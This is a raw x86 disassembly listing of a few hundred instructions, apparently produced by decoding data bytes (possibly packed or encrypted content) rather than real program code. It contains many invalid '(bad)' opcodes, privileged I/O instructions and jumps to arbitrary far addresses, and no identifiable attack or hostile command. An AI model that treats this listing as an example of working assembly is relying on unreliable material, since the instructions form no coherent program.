  41c1c3:	mov    ah,0x86
  41c1c5:	in     al,dx
  41c1c6:	sbb    al,0x68
  41c1c8:	fisub  WORD PTR [ebp+0x7f]
  41c1cb:	xchg   ecx,eax
  41c1cc:	xchg   esp,eax
  41c1cd:	pushf  
  41c1ce:	bound  edx,QWORD PTR [edi]
  41c1d0:	fdiv   QWORD PTR [edx]
  41c1d2:	mov    eax,0xe362c40
  41c1d7:	in     eax,0xca
  41c1d9:	ret    0x52b8
  41c1dc:	mov    eax,gs:0xaa4d0732
  41c1e2:	jecxz  0x41c1c7
  41c1e4:	leave  
  41c1e5:	sbb    eax,0x9febc197
  41c1ea:	and    eax,0x4ab27247
  41c1ef:	mov    eax,?
  41c1f1:	ja     0x41c240
  41c1f3:	lock stos BYTE PTR es:[edi],al
  41c1f5:	or     eax,0x9c5ac9fa
  41c1fa:	(bad)  
  41c1fb:	mul    BYTE PTR [edx-0x746bfc1]
  41c201:	xchg   BYTE PTR ds:0x9cc6bb3,dh
  41c207:	add    al,0x6f
  41c209:	dec    eax
  41c20a:	mov    esi,0xce3708d3
  41c20f:	sbb    eax,0x78fc809b
  41c214:	xchg   BYTE PTR [ecx-0x6af9a308],al
  41c21a:	int3   
  41c21b:	enter  0x4b56,0xb0
  41c21f:	stos   BYTE PTR es:[edi],al
  41c220:	rol    DWORD PTR [edi-0x3f],1
  41c223:	pop    es
  41c224:	fsub   QWORD PTR [esi+ebx*4-0x33]
  41c228:	dec    edx
  41c229:	sbb    edx,edx
  41c22b:	jmp    0x4f4205d3
  41c230:	mov    esi,0x774b634b
  41c235:	shr    DWORD PTR [ecx+0x25],0x6b
  41c239:	das    
  41c23a:	(bad)  
  41c23b:	fdiv   st,st(6)
  41c23d:	mov    DWORD PTR ds:0xc46ff590,0x724b7907
  41c247:	push   0xa1a9c694
  41c24c:	(bad)  [edx-0x3c]
  41c24f:	clc    
  41c250:	dec    ebx
  41c251:	cwde   
  41c252:	pop    ecx
  41c253:	daa    
  41c254:	bound  eax,QWORD PTR [eax+0x5b]
  41c257:	xlat   BYTE PTR ds:[ebx]
  41c258:	or     ch,BYTE PTR [ebx+0x7b07b5e6]
  41c25e:	arpl   WORD PTR [ebx+0x3e],ax
  41c261:	pop    edi
  41c262:	sar    cl,cl
  41c264:	inc    esp
  41c265:	push   ebx
  41c266:	or     al,0x9a
  41c268:	in     al,dx
  41c269:	mov    ds:0xf2971b3a,eax
  41c26e:	div    DWORD PTR [edi-0x78]
  41c271:	push   ebx
  41c272:	rcl    DWORD PTR [esi],0x49
  41c275:	xchg   DWORD PTR [esp+ebp*1-0x19],esi
  41c279:	push   esp
  41c27a:	lea    ebp,[eax+0x68971b01]
  41c280:	test   eax,0xadae6e22
  41c285:	pop    eax
  41c286:	jmp    0x4304c723
  41c28b:	int    0x0
  41c28d:	adc    edi,DWORD PTR [ebx]
  41c28f:	sub    eax,0xc9828c95
  41c294:	mov    bl,0x42
  41c296:	xchg   esp,eax
  41c297:	xchg   ebx,eax
  41c298:	xor    al,0x90
  41c29a:	aaa    
  41c29b:	pop    ds
  41c29c:	pop    edx
  41c29d:	sbb    dl,BYTE PTR [eax+0x686cb65c]
  41c2a3:	cmp    eax,0xb0240a84
  41c2a8:	fistp  DWORD PTR [esi+ebx*2-0x659d9831]
  41c2af:	xchg   edx,eax
  41c2b0:	jle    0x41c2cf
  41c2b2:	dec    eax
  41c2b3:	(bad)  
  41c2b5:	add    eax,0x69202f53
  41c2ba:	add    ah,bl
  41c2bc:	pop    eax
  41c2bd:	repnz test eax,0xda2b20ca
  41c2c3:	test   DWORD PTR [edi+0x4c],0x8db54663
  41c2ca:	push   ecx
  41c2cb:	(bad)  
  41c2cd:	inc    ebp
  41c2ce:	xchg   ebx,eax
  41c2cf:	or     BYTE PTR ds:0x3404dd62,ch
  41c2d5:	iret   
  41c2d6:	(bad)  
  41c2d7:	cs in  eax,dx
  41c2d9:	mov    ds:0xd33f36d3,al
  41c2de:	cdq    
  41c2df:	adc    eax,0x1d075eac
  41c2e4:	or     al,0xff
  41c2e6:	enter  0xed3a,0x12
  41c2ea:	scas   eax,DWORD PTR es:[edi]
  41c2eb:	out    dx,al
  41c2ec:	daa    
  41c2ed:	and    al,0xe2
  41c2ef:	sub    dh,BYTE PTR [edx+0x1f]
  41c2f2:	ja     0x41c325
  41c2f4:	sub    eax,0x5ce0b163
  41c2f9:	outs   dx,DWORD PTR ds:[esi]
  41c2fa:	jne    0x41c36e
  41c2fc:	nop
  41c2fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2fe:	arpl   WORD PTR [eax+0x1b0c3abc],cx
  41c304:	repz add eax,0x1ddb2124
  41c30a:	outs   dx,BYTE PTR ds:[esi]
  41c30b:	inc    ecx
  41c30c:	xor    al,0x1f
  41c30e:	xchg   ebp,eax
  41c30f:	sti    
  41c310:	test   eax,0x10c0d2f7
  41c315:	xchg   ecx,eax
  41c316:	scas   eax,DWORD PTR es:[edi]
  41c317:	sub    al,0xe1
  41c319:	push   0x79
  41c31b:	xor    DWORD PTR [eax-0x55],esi
  41c31e:	aas    
  41c31f:	and    ch,BYTE PTR [ecx+ecx*1+0x50]
  41c323:	push   ebp
  41c324:	xchg   edx,eax
  41c325:	xchg   ebp,eax
  41c326:	inc    eax
  41c327:	push   ds
  41c328:	pushf  
  41c329:	and    ah,0x2e
  41c32c:	fs nop
  41c32e:	ja     0x41c32a
  41c330:	and    dh,BYTE PTR [ecx-0x70]
  41c333:	mov    ebx,edx
  41c335:	add    DWORD PTR [edx+0x700e804f],0x5e1f5739
  41c33f:	sbb    al,0xf9
  41c341:	mov    ebx,cs
  41c343:	(bad)  
  41c344:	sbb    BYTE PTR [ebp-0x24cfbe40],cl
  41c34a:	and    BYTE PTR [ebp-0x3b0ec783],ah
  41c350:	push   es
  41c351:	cli    
  41c352:	shr    BYTE PTR [esi+ebx*1],1
  41c355:	mov    esi,0x3cd2cf55
  41c35a:	push   0xffffff91
  41c35c:	sbb    BYTE PTR [eax],0x46
  41c35f:	ins    DWORD PTR es:[edi],dx
  41c360:	xchg   ecx,eax
  41c361:	mov    DWORD PTR [ebp+0x7fb1c678],ebp
  41c367:	mov    esp,fs
  41c369:	jle    0x41c306
  41c36b:	lea    ecx,[ebp+edi*2-0x51]
  41c36f:	nop    DWORD PTR [edi+0x1]
  41c373:	lods   al,BYTE PTR ds:[esi]
  41c374:	jge    0x41c3f1
  41c376:	retf   0x46f
  41c379:	dec    edx
  41c37a:	mov    cl,0x13
  41c37c:	xor    al,0x28
  41c37e:	push   ebx
  41c37f:	int    0xf
  41c381:	push   esi
  41c382:	cmp    al,0xd4
  41c384:	adc    ah,cl
  41c386:	fcomp  DWORD PTR [edi-0x9273915]
  41c38c:	sub    al,0x25
  41c38e:	fwait
  41c38f:	xchg   ecx,eax
  41c390:	sbb    cl,BYTE PTR [ebx]
  41c392:	inc    esi
  41c393:	inc    ecx
  41c394:	cdq    
  41c395:	push   es
  41c396:	arpl   WORD PTR [eax+0x8],cx
  41c399:	mov    al,0x67
  41c39b:	push   cs
  41c39c:	int3   
  41c39d:	ficomp DWORD PTR [ebx+eiz*2]
  41c3a0:	xchg   esi,eax
  41c3a1:	fwait
  41c3a2:	inc    eax
  41c3a3:	xlat   BYTE PTR ds:[ebx]
  41c3a4:	retf   
  41c3a5:	dec    esp
  41c3a6:	sub    eax,0xea7bf0de
  41c3ab:	mov    al,0xaf
  41c3ad:	mov    ss,WORD PTR [ebp+0x4d3da778]
  41c3b3:	xchg   edi,eax
  41c3b4:	xchg   ecx,eax
  41c3b5:	sbb    DWORD PTR ds:0xcd2aaf13,ecx
  41c3bb:	mov    edi,0xd15aac36
  41c3c0:	in     al,dx
  41c3c1:	push   esp
  41c3c2:	stos   DWORD PTR es:[edi],eax
  41c3c3:	aam    0x5e
  41c3c5:	jne    0x41c407
  41c3c7:	nop
  41c3c8:	add    eax,0x935bc49d
  41c3cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3ce:	(bad)  
  41c3cf:	push   DWORD PTR [ecx-0x3e]
  41c3d2:	add    ebp,DWORD PTR [ebp-0x2c]
  41c3d5:	outs   dx,DWORD PTR ds:[esi]
  41c3d6:	and    ah,BYTE PTR [edi]
  41c3d8:	dec    edx
  41c3d9:	xchg   ebx,eax
  41c3da:	add    dl,ch
  41c3dc:	push   ds
  41c3dd:	shl    DWORD PTR [edx+0x51e322a5],cl
  41c3e3:	adc    al,0x42
  41c3e5:	jl     0x41c378
  41c3e7:	imul   eax,eax,0x50252b87
  41c3ed:	(bad)  
  41c3ee:	into   
  41c3ef:	cdq    
  41c3f0:	out    dx,eax
  41c3f1:	(bad)  
  41c3f2:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41c3f4:	(bad)  
  41c3f5:	jmp    0x41c405
  41c3f7:	call   0x4a82346f
  41c3fc:	and    eax,0x43490ea8
  41c401:	std    
  41c402:	repz push ebx
  41c404:	push   edx
  41c405:	enter  0x5adc,0x83
  41c409:	pusha  
  41c40a:	out    dx,al
  41c40b:	sub    BYTE PTR [ebp+ecx*1-0x7d26c44d],bh
  41c412:	cmp    BYTE PTR [edi],al
  41c414:	(bad)  
  41c415:	nop
  41c416:	push   eax
  41c417:	pop    eax
  41c418:	ins    BYTE PTR es:[edi],dx
  41c419:	jmp    0xfc35ae83
  41c41e:	js     0x41c46a
  41c420:	je     0x41c499
  41c422:	idiv   cl
  41c424:	mov    ah,0xa4
  41c426:	jle    0x41c3cb
  41c428:	in     al,dx
  41c429:	aad    0x22
  41c42b:	or     BYTE PTR [ecx-0x64e3a8da],ah
  41c431:	mov    cl,bl
  41c433:	mov    ecx,0x249f74ce
  41c438:	icebp  
  41c439:	imul   edx,DWORD PTR [ebx-0x7f],0xffffffcf
  41c43d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c43e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c43f:	ins    DWORD PTR es:[edi],dx
  41c440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c441:	ins    DWORD PTR es:[edi],dx
  41c442:	sub    eax,0x5c491f08
  41c447:	push   es
  41c448:	mov    eax,0xa5ad93d6
  41c44d:	out    0x7c,eax
  41c44f:	sbb    eax,DWORD PTR [eax-0x51]
  41c452:	xor    BYTE PTR ds:[ebx+ebp*4],cl
  41c456:	pop    edi
  41c457:	adc    al,0xd3
  41c459:	pop    ebx
  41c45a:	mov    edi,0xc6905057
  41c45f:	push   ebx
  41c460:	adc    dh,0x8
  41c463:	outs   dx,DWORD PTR ds:[esi]
  41c464:	and    DWORD PTR gs:[edx],edx
  41c467:	popa   
  41c468:	mov    ch,0x6a
  41c46a:	or     dh,bl
  41c46c:	push   esi
  41c46d:	pop    ebx
  41c46e:	xchg   esp,eax
  41c46f:	stc    
  41c470:	mov    edx,0x65b0e8aa
  41c475:	popa   
  41c476:	jae    0x41c3fa
  41c478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c479:	xor    DWORD PTR [ebp-0x75768c58],esp
  41c47f:	xchg   ebp,eax
  41c480:	adc    BYTE PTR [ecx+0x8],bh
  41c483:	(bad)  
  41c484:	fs sahf 
  41c486:	mov    ch,0x9
  41c488:	mov    ecx,0xcccf01b4
  41c48d:	cdq    
  41c48e:	retf   
  41c48f:	lock outs dx,DWORD PTR ds:[esi]
  41c491:	(bad)  
  41c493:	sbb    al,0x74
  41c495:	or     BYTE PTR [esi-0xdaaee02],ah
  41c49b:	jmp    0x72121ffe
  41c4a0:	jge    0x41c489
  41c4a2:	mov    ch,0x0
  41c4a4:	lds    esi,FWORD PTR [eax]
  41c4a6:	adc    eax,0xd0f8ac80
  41c4ab:	cmp    BYTE PTR gs:[ecx+0x2f],ah
  41c4af:	sub    al,0x58
  41c4b1:	stos   BYTE PTR es:[edi],al
  41c4b2:	jmp    0x41c4a7
  41c4b4:	inc    edx
  41c4b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4b6:	call   0x1d93193a
  41c4bb:	loopne 0x41c484
  41c4bd:	punpcklwd mm2,mm4
  41c4c0:	xchg   DWORD PTR [esi],eax
  41c4c2:	cmp    BYTE PTR [ecx+0x15],dh
  41c4c5:	push   ebp
  41c4c6:	cmp    al,0xee
  41c4c8:	gs mov ah,0x5b
  41c4cb:	and    eax,0x4ff22268
  41c4d0:	push   ebx
  41c4d1:	jmp    0x8983:0x24f4a8f1
  41c4d8:	xor    BYTE PTR [ebp-0x74],dl
  41c4db:	push   ds
  41c4dc:	mov    dl,0xe0
  41c4de:	lods   al,BYTE PTR ds:[esi]
  41c4df:	mov    WORD PTR [esi],?
  41c4e1:	mov    edi,0xac66680a
  41c4e6:	outs   dx,BYTE PTR ds:[esi]
  41c4e7:	(bad)  
  41c4e8:	stc    
  41c4e9:	sub    ebx,DWORD PTR [esi+0xccb322f]
  41c4ef:	adc    al,BYTE PTR [edx+0x7888f4b1]
  41c4f5:	xchg   edx,eax
  41c4f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4f7:	enter  0xfa85,0xca
  41c4fb:	in     eax,dx
  41c4fc:	add    al,0x81
  41c4fe:	jl     0x41c556
  41c500:	push   cs
  41c501:	repnz inc esi
  41c503:	push   edi
  41c504:	das    
  41c505:	xor    al,0x16
  41c507:	cmp    DWORD PTR [eax+0x5bf9cb8],esp
  41c50d:	iret   
  41c50e:	and    BYTE PTR [esi+edx*8-0x1f],dl
  41c512:	ror    edi,0x41
  41c515:	adc    al,0x5b
  41c517:	loope  0x41c53c
  41c519:	mov    edx,DWORD PTR [esp+edx*8]
  41c51c:	xchg   ebx,eax
  41c51d:	popa   
  41c51e:	mov    ah,0xde
  41c520:	dec    edi
  41c521:	stc    
  41c522:	fs sar dh,0x8a
  41c526:	dec    ecx
  41c527:	mov    ecx,0x752da45b
  41c52c:	fs pop ebp
  41c52e:	inc    edi
  41c52f:	sub    al,0xd3
  41c531:	sub    esi,esp
  41c533:	and    al,0x56
  41c535:	xchg   ecx,eax
  41c536:	cmp    DWORD PTR fs:[ebx-0x7e],0xe1ad6747
  41c53e:	mov    ah,BYTE PTR [edi+0x194433b0]
  41c544:	and    ebp,edi
  41c546:	das    
  41c547:	and    ecx,DWORD PTR [ecx]
  41c549:	pop    ebx
  41c54a:	stc    
  41c54b:	pop    eax
  41c54c:	fs scas al,BYTE PTR es:[edi]
  41c54e:	div    ch
  41c550:	jns    0x41c563
  41c552:	scas   eax,DWORD PTR es:[edi]
  41c553:	adc    bl,BYTE PTR ds:0x6f7b696b
  41c559:	xor    edx,DWORD PTR [ebp-0x56897f55]
  41c55f:	fs cmp ax,0xd0fe
  41c564:	mov    ds:0xd83d15b1,al
  41c569:	mov    al,ds:0x409f401b
  41c56e:	popf   
  41c56f:	pop    edi
  41c570:	sub    BYTE PTR [esi],al
  41c572:	push   ds
  41c573:	ja     0x41c56e
  41c575:	sahf   
  41c576:	and    dh,BYTE PTR [edi-0x20]
  41c579:	xchg   esp,eax
  41c57a:	adc    DWORD PTR [edx+0x2e3ad400],eax
  41c580:	ds pop esi
  41c582:	adc    eax,0x82bfb658
  41c587:	xlat   BYTE PTR ds:[ebx]
  41c588:	daa    
  41c589:	jg     0x41c581
  41c58b:	adc    ecx,edx
  41c58d:	rcl    DWORD PTR [edx-0x19],0xd6
  41c591:	sbb    al,BYTE PTR [edx-0x5733f727]
  41c597:	add    ebp,eax
  41c599:	push   ecx
  41c59a:	mov    ds:0x9e32f791,eax
  41c59f:	xor    eax,0x4951a4a7
  41c5a4:	fwait
  41c5a5:	loop   0x41c5a2
  41c5a7:	in     eax,dx
  41c5a8:	xor    BYTE PTR [ecx-0x255588dc],al
  41c5ae:	(bad)  
  41c5af:	shl    DWORD PTR [ecx],1
  41c5b1:	or     ebp,DWORD PTR [ebx]
  41c5b3:	nop
  41c5b4:	push   esp
  41c5b5:	fwait
  41c5b6:	jl     0x41c618
  41c5b8:	xor    dh,BYTE PTR [ecx]
  41c5ba:	(bad)  
  41c5bc:	xor    DWORD PTR [edi+edx*1],ebx
  41c5bf:	sub    DWORD PTR [edi+0x57],ecx
  41c5c2:	ror    BYTE PTR [eax-0x46],0xb3
  41c5c6:	pushf  
  41c5c7:	inc    ecx
  41c5c8:	cld    
  41c5c9:	aaa    
  41c5ca:	inc    edi
  41c5cb:	and    ebx,ebp
  41c5cd:	addr16 sub al,0xfe
  41c5d0:	hlt    
  41c5d1:	add    BYTE PTR [esi-0x626cbc07],bh
  41c5d7:	pop    edx
  41c5d8:	adc    ch,BYTE PTR [edx]
  41c5da:	inc    eax
  41c5db:	out    0xdb,eax
  41c5dd:	rcl    al,cl
  41c5df:	dec    ecx
  41c5e0:	mov    al,ds:0xb80e7ef9
  41c5e5:	ret    0xb776
  41c5e8:	in     eax,dx
  41c5e9:	jmp    0x1554dd08
  41c5ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5ef:	and    al,0x6a
  41c5f1:	mov    ds:0x15ba536e,eax
  41c5f6:	cmp    esp,DWORD PTR [edx]
  41c5f8:	retf   0xc0d0
  41c5fb:	mov    al,0x2a
  41c5fd:	xor    dl,BYTE PTR [eax+ecx*2]
  41c600:	or     al,BYTE PTR [eax+0x5f]
  41c603:	lods   eax,DWORD PTR ds:[esi]
  41c604:	cld    
  41c605:	leave  
  41c606:	cld    
  41c607:	stos   DWORD PTR es:[edi],eax
  41c608:	or     eax,0xcf9c4c1c
  41c60d:	dec    edx
  41c60e:	add    al,0x7e
  41c610:	icebp  
  41c611:	loop   0x41c5c6
  41c613:	dec    BYTE PTR fs:[edi+0x51e74422]
  41c61a:	arpl   WORD PTR ds:0x15dc8e1a,sp
  41c620:	ret    
  41c621:	fmul   st,st(5)
  41c623:	push   esp
  41c624:	sub    bh,BYTE PTR [eax-0x52]
  41c627:	addr16 pop eax
  41c629:	cdq    
  41c62a:	neg    DWORD PTR [ebp-0x7a]
  41c62d:	cwde   
  41c62e:	xchg   esp,eax
  41c62f:	xchg   ebx,eax
  41c631:	fld    QWORD PTR [edi+edi*8+0x37e968f7]
  41c638:	push   cs
  41c639:	cmc    
  41c63a:	adc    al,0x15
  41c63c:	fidivr WORD PTR [ebx-0x34]
  41c63f:	cli    
  41c640:	mov    esi,0x27c4605b
  41c645:	jg     0x41c66a
  41c647:	inc    edx
  41c648:	fcmovnbe st,st(4)
  41c64a:	scas   al,BYTE PTR es:[edi]
  41c64b:	push   cs
  41c64c:	mov    ebp,0x1036f7
  41c651:	stos   DWORD PTR es:[edi],eax
  41c652:	jbe    0x41c5df
  41c654:	cmp    al,0x5f
  41c656:	scas   eax,DWORD PTR es:[edi]
  41c657:	pop    eax
  41c658:	dec    edi
  41c659:	adc    bh,bh
  41c65b:	xchg   ebx,eax
  41c65c:	adc    ecx,0x52df438
  41c662:	sar    BYTE PTR [ebp+0x1a],cl
  41c665:	ror    BYTE PTR [edx],1
  41c667:	popf   
  41c668:	xor    al,0xac
  41c66a:	out    dx,eax
  41c66b:	sub    al,BYTE PTR [edx]
  41c66d:	jmp    0x7450d93b
  41c672:	jmp    0x16e6c36b
  41c677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c678:	jae    0x41c6d6
  41c67a:	pop    esi
  41c67b:	loop   0x41c6aa
  41c67d:	enter  0xcda2,0x57
  41c681:	int3   
  41c682:	pop    ebx
  41c683:	xchg   ebx,eax
  41c684:	mov    esp,0xae970f35
  41c689:	in     al,dx
  41c68a:	inc    esp
  41c68b:	ss pop ebx
  41c68d:	mov    WORD PTR [esi+0xd],ss
  41c690:	jbe    0x41c6b2
  41c692:	mov    gs,esi
  41c694:	fidivr DWORD PTR [edi-0x44750e2b]
  41c69a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c69b:	sbb    eax,edi
  41c69d:	push   eax
  41c69e:	jb     0x41c70e
  41c6a0:	push   esp
  41c6a1:	sub    DWORD PTR [edi-0x5d0a2908],esi
  41c6a7:	add    BYTE PTR [ebx+0x40],cl
  41c6aa:	add    DWORD PTR [esp+ebp*8+0x155ac5f4],ecx
  41c6b1:	pop    eax
  41c6b2:	push   esi
  41c6b3:	(bad)  
  41c6b4:	pop    ebp
  41c6b5:	shl    DWORD PTR [ecx],cl
  41c6b7:	mov    ds:0xef33217c,al
  41c6bc:	pop    edx
  41c6bd:	and    ebp,esp
  41c6bf:	test   BYTE PTR [edi],ch
  41c6c1:	in     eax,dx
  41c6c2:	adc    DWORD PTR [edx],esp
  41c6c4:	data16 scas al,BYTE PTR es:[edi]
  41c6c6:	pop    ebp
  41c6c7:	popf   
  41c6c8:	and    BYTE PTR [eax+0x59925b5e],dl
  41c6ce:	mov    ds:0xe412a8b5,al
  41c6d3:	sbb    BYTE PTR [ebx+edx*8+0x3f],bl
  41c6d7:	scas   eax,DWORD PTR es:[edi]
  41c6d8:	push   edx
  41c6d9:	jmp    0x9a37b82f
  41c6de:	cmp    eax,0x5de22670
  41c6e3:	sub    DWORD PTR [eax-0x14ef5006],ebx
  41c6e9:	fstp   TBYTE PTR [esi-0x292525b4]
  41c6ef:	dec    esp
  41c6f0:	push   eax
  41c6f1:	cmp    eax,0xf568ee93
  41c6f6:	cld    
  41c6f7:	sub    eax,esp
  41c6f9:	retf   
  41c6fa:	sar    BYTE PTR gs:[edi-0x7df301b1],0x42
  41c702:	call   0xcb619f89
  41c707:	mov    eax,ds:0xe95c149a
  41c70c:	jnp    0x41c75c
  41c70e:	xor    ecx,DWORD PTR [edi-0xf73d5be]
  41c714:	sbb    DWORD PTR [edi-0x3b],edi
  41c717:	mov    cl,0x44
  41c719:	stos   BYTE PTR es:[edi],al
  41c71a:	ret    
  41c71b:	test   al,0xe7
  41c71d:	pushf  
  41c71e:	(bad)
  41c721:	cmp    dl,al
  41c723:	fld    DWORD PTR [eax]
  41c725:	mov    ds:0x1eb3e0bd,al
  41c72a:	add    al,0xf9
  41c72c:	push   ss
  41c72d:	push   esp
  41c72e:	shr    DWORD PTR [ecx],cl
  41c730:	mov    eax,0x3b66345a
  41c735:	icebp  
  41c736:	mov    ah,0x38
  41c738:	or     eax,0x521e827e
  41c73d:	jmp    0x7cda49ac
  41c742:	cmp    DWORD PTR [edx],ecx
  41c744:	add    bl,BYTE PTR [edx-0xb]
  41c747:	xchg   BYTE PTR [edx],cl
  41c749:	bsf    esp,DWORD PTR [ebx-0x69]
  41c74d:	scas   eax,DWORD PTR es:[edi]
  41c74e:	ds aas 
  41c750:	jle    0x41c75f
  41c752:	push   ds
  41c753:	rol    BYTE PTR [edx-0x4b],0x7f
  41c757:	repz lea ebp,[ecx]
  41c75a:	lods   eax,DWORD PTR ds:[esi]
  41c75b:	mov    eax,0xe4e58611
  41c760:	sahf   
  41c761:	scas   eax,DWORD PTR es:[edi]
  41c762:	out    0xa,al
  41c764:	push   es
  41c765:	scas   eax,DWORD PTR es:[edi]
  41c766:	lods   al,BYTE PTR ds:[esi]
  41c767:	(bad)  
  41c768:	loope  0x41c755
  41c76a:	or     cl,ch
  41c76c:	mov    al,0xe3
  41c76e:	cs add eax,esp
  41c771:	int    0x1f
  41c773:	addr16 leave 
  41c775:	dec    ecx
  41c776:	cmp    esi,DWORD PTR ss:[edx]
  41c779:	into   
  41c77a:	pushf  
  41c77b:	xchg   ecx,eax
  41c77c:	cli    
  41c77d:	leave  
  41c77e:	xchg   cl,ah
  41c780:	sub    BYTE PTR [ebp+0x22],bl
  41c783:	mov    dh,0xcf
  41c785:	or     al,0x2e
  41c787:	ins    DWORD PTR es:[edi],dx
  41c788:	imul   ecx,DWORD PTR [esi+0x2cd53f7e],0x6bc3996
  41c792:	lahf   
  41c793:	shl    DWORD PTR [ecx-0x794678ed],1
  41c799:	mov    DWORD PTR [esi-0x50],edx
  41c79c:	mov    dh,0x83
  41c79e:	or     eax,0xb59b993a
  41c7a3:	jl     0x41c808
  41c7a5:	ins    BYTE PTR es:[edi],dx
  41c7a6:	retf   
  41c7a7:	inc    ebx
  41c7a8:	ret    
  41c7a9:	je     0x41c73e
  41c7ab:	mov    ebx,0x9350cd89
  41c7b0:	and    edi,DWORD PTR [edx]
  41c7b2:	sbb    esi,DWORD PTR [edi]
  41c7b4:	outs   dx,BYTE PTR ds:[esi]
  41c7b5:	call   0x48e4:0x94fe20c8
  41c7bc:	mov    dl,0xcf
  41c7be:	dec    ebx
  41c7bf:	aas    
  41c7c0:	push   cs
  41c7c1:	cmp    al,0x35
  41c7c3:	sub    bh,dh
  41c7c5:	mov    ch,0x6c
  41c7c7:	and    DWORD PTR [ebx],eax
  41c7c9:	add    DWORD PTR [edx],ecx
  41c7cb:	test   eax,0xa27a0b14
  41c7d0:	(bad)  
  41c7d2:	shl    BYTE PTR [eax-0x74488adb],0x75
  41c7d9:	xor    bh,ch
  41c7db:	mov    ebp,0x28992f2f
  41c7e0:	hlt    
  41c7e1:	jmp    0x1aef:0x62983209
  41c7e8:	jp     0x41c7c5
  41c7ea:	das    
  41c7eb:	les    ebp,FWORD PTR [ecx-0xd]
  41c7ee:	sbb    bh,ch
  41c7f0:	rol    BYTE PTR [edi],cl
  41c7f2:	mov    edi,0x9eefe7e3
  41c7f7:	lds    ebx,FWORD PTR [esi-0x39112af6]
  41c7fd:	xchg   DWORD PTR [edi],ebx
  41c7ff:	stc    
  41c800:	adc    esi,ecx
  41c802:	outs   dx,DWORD PTR ds:[esi]
  41c803:	pop    ds
  41c804:	dec    edx
  41c805:	mov    dh,0xe0
  41c807:	call   0xf0684803
  41c80c:	mov    edx,0x908282d7
  41c811:	fidiv  WORD PTR [ecx]
  41c813:	(bad)  
  41c814:	ficom  DWORD PTR [ebp+0x5f]
  41c817:	sub    BYTE PTR [edi+0x42c66ed1],dh
  41c81d:	jmp    0x11ff:0x8fb15c8a
  41c824:	cld    
  41c825:	in     al,0x4d
  41c827:	aaa    
  41c828:	mov    bl,0xf
  41c82a:	lods   al,BYTE PTR ds:[esi]
  41c82b:	aaa    
  41c82c:	dec    edi
  41c82d:	add    eax,0x1103813c
  41c832:	fcomp  QWORD PTR [esi+ebp*8]
  41c835:	cmp    eax,0xd9ecc71c
  41c83a:	cwde   
  41c83b:	push   ebp
  41c83c:	fcmovnb st,st(5)
  41c83f:	fwait
  41c840:	in     eax,dx
  41c841:	mov    edx,0xbdf854ac
  41c846:	mov    edi,DWORD PTR [esi-0x88ede22]
  41c84c:	jo     0x41c874
  41c84e:	lods   al,BYTE PTR ds:[esi]
  41c84f:	ds es (bad) 
  41c852:	repnz xchg esi,eax
  41c854:	popf   
  41c855:	inc    ecx
  41c856:	lds    edi,FWORD PTR [ecx+0x1f0f32d]
  41c85c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c85d:	and    BYTE PTR [ebx-0x19],bl
  41c860:	sahf   
  41c861:	add    BYTE PTR [ebp-0x294d6b64],0xe6
  41c868:	push   esi
  41c869:	shl    BYTE PTR [ebx-0x17],cl
  41c86c:	ret    0xbe62
  41c86f:	inc    esi
  41c870:	dec    esp
  41c871:	(bad)  
  41c872:	pop    edi
  41c873:	retf   0xb97c
  41c876:	retf   
  41c877:	push   ecx
  41c878:	push   esi
  41c879:	mov    ecx,0x6841fc03
  41c87e:	test   esi,0xc822ff8c
  41c884:	dec    eax
  41c885:	fmul   st(6),st
  41c887:	mov    edx,0xa90e95d2
  41c88c:	aam    0xd1
  41c88e:	nop
  41c88f:	jle    0x41c83e
  41c891:	or     DWORD PTR ss:[esi-0x6d647a73],edi
  41c898:	dec    eax
  41c899:	cs mov ebx,0xdf413e9a
  41c89f:	daa    
  41c8a0:	or     al,0x6a
  41c8a2:	daa    
  41c8a3:	mov    ch,0x84
  41c8a5:	adc    DWORD PTR [ebx+0x4fe584c],0x4
  41c8ac:	fs dec esp
  41c8ae:	sub    edx,DWORD PTR [eax+0x77]
  41c8b1:	shr    DWORD PTR [esi+edx*4],1
  41c8b4:	jle    0x41c868
  41c8b6:	or     al,0x41
  41c8b8:	add    eax,0xdce25348
  41c8bd:	jmp    0x2804:0x67d26620
  41c8c4:	ret    0x2e35
  41c8c7:	retf   
  41c8c8:	adc    ah,bl
  41c8ca:	adc    BYTE PTR [ebp-0x7a],al
  41c8cd:	jecxz  0x41c89e
  41c8cf:	or     DWORD PTR [ecx+0x78231a17],esp
  41c8d5:	mov    bl,0x7e
  41c8d7:	push   ecx
  41c8d8:	xchg   edi,eax
  41c8d9:	inc    ecx
  41c8da:	(bad)  
  41c8db:	stos   DWORD PTR es:[edi],eax
  41c8dc:	jbe    0x41c8b8
  41c8de:	mov    WORD PTR [eax-0x13],cs
  41c8e1:	pop    ebp
  41c8e2:	pop    esp
  41c8e3:	(bad)  
  41c8e5:	lock add eax,0x3b4aa03d
  41c8eb:	mov    esi,esp
  41c8ed:	lahf   
  41c8ee:	icebp  
  41c8ef:	xor    esp,DWORD PTR [edx]
  41c8f1:	or     bl,bl
  41c8f3:	pop    edx
  41c8f4:	shl    DWORD PTR [ebx],0xe2
  41c8f7:	jle    0x41c938
  41c8f9:	dec    edi
  41c8fa:	cli    
  41c8fb:	test   BYTE PTR [edi+ecx*8-0x39710745],0xbb
  41c903:	or     al,0x6b
  41c905:	jmp    0xdeff896f
  41c90a:	lea    ebp,[ecx+edi*1-0x71fd27e1]
  41c911:	test   BYTE PTR [eax-0x1a],dl
  41c914:	rol    DWORD PTR [eax+edx*4+0x25bc3dc6],1
  41c91b:	adc    eax,0xb639fbdf
  41c920:	scas   al,BYTE PTR es:[edi]
  41c921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c922:	cmp    DWORD PTR [eax+0x53],ebp
